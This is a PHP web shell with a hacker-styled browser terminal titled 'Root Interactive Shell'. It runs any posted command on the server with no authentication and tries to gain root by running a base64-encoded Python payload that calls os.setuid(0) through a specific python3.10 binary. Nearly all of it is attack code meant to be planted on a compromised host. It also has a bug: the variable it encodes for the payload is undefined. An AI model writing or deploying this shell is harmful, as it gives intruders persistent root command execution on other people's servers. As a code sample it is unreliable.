<?php
session_start();
if (!isset($_SESSION['pwd'])) $_SESSION['pwd'] = trim(shell_exec('pwd'));

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $current_pwd = $_SESSION['pwd'];

    // ניהול פקודת CD
    if (preg_match('/^cd\s+(.+)/', $cmd, $matches)) {
        $target = $matches[1];
        $new_dir = shell_exec("cd $current_pwd && cd $target && pwd 2>&1");
        if (is_dir(trim($new_dir))) {
            $_SESSION['pwd'] = trim($new_dir);
            echo "[Directory changed to " . $_SESSION['pwd'] . "]";
        } else {
            echo "bash: cd: $target: No such file or directory";
        }
        exit;
    }

    // Payload פייתון עם os.popen ו-setuid(0)
    $full_cmd = "cd $current_pwd && $cmd";
    $b64 = base64_encode($full_command);
    
    $py_payload = "import os, base64; os.setuid(0); print(os.popen(base64.b64decode('$b64').decode() + ' 2>&1').read())";
    
    // הרצה דרך ה-Binary הספציפי
    echo shell_exec("/usr/bin/python3.10 -c " . escapeshellarg($py_payload));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Root Interactive Shell</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Consolas', monospace; padding: 20px; }
        #console { background: #000; border: 1px solid #444; height: 85vh; overflow-y: auto; padding: 10px; box-shadow: 0 0 15px #003300; }
        .prompt { color: #ff3333; font-weight: bold; }
        .out { white-space: pre-wrap; margin-bottom: 12px; color: #ccc; }
        input { background: transparent; border: none; color: #00ff00; font-family: inherit; font-size: 16px; width: 80%; outline: none; }
        .user-cmd { color: #00ccff; }
    </style>
</head>
<body>
    <div id="console">
        <div id="logs"></div>
        <div id="input-line">
            <span class="prompt" id="prompt">root@target:<?php echo $_SESSION['pwd']; ?># </span>
            <input type="text" id="cmdInput" autofocus autocomplete="off">
        </div>
    </div>

    <script>
        const input = document.getElementById('cmdInput');
        const logs = document.getElementById('logs');
        const promptLabel = document.getElementById('prompt');
        
        let history = [];
        let historyIdx = -1;

        input.addEventListener('keydown', async (e) => {
            // היסטוריה - חץ למעלה
            if (e.key === 'ArrowUp') {
                if (historyIdx < history.length - 1) {
                    historyIdx++;
                    input.value = history[history.length - 1 - historyIdx];
                }
                e.preventDefault();
            }
            // היסטוריה - חץ למטה
            else if (e.key === 'ArrowDown') {
                if (historyIdx > 0) {
                    historyIdx--;
                    input.value = history[history.length - 1 - historyIdx];
                } else {
                    historyIdx = -1;
                    input.value = '';
                }
                e.preventDefault();
            }
            // הרצת פקודה - Enter
            else if (e.key === 'Enter') {
                const cmd = input.value.trim();
                if (!cmd) return;

                if (cmd === 'clear') {
                    logs.innerHTML = '';
                    input.value = '';
                    return;
                }

                logs.innerHTML += `<div><span class="prompt">${promptLabel.innerText}</span> <span class="user-cmd">${cmd}</span></div>`;
                history.push(cmd);
                historyIdx = -1;
                input.value = '';

                const fd = new FormData();
                fd.append('cmd', cmd);

                const res = await fetch('', { method: 'POST', body: fd });
                const out = await res.text();

                logs.innerHTML += `<div class="out">${out}</div>`;
                
                // עדכון נתיב ב-UI
                if (cmd.startsWith('cd ')) {
                    const match = out.match(/\[Directory changed to (.+)\]/);
                    if (match) promptLabel.innerText = `root@target:${match[1]}# `;
                }

                document.getElementById('console').scrollTop = document.getElementById('console').scrollHeight;
            }
        });
    </script>
</body>
</html>
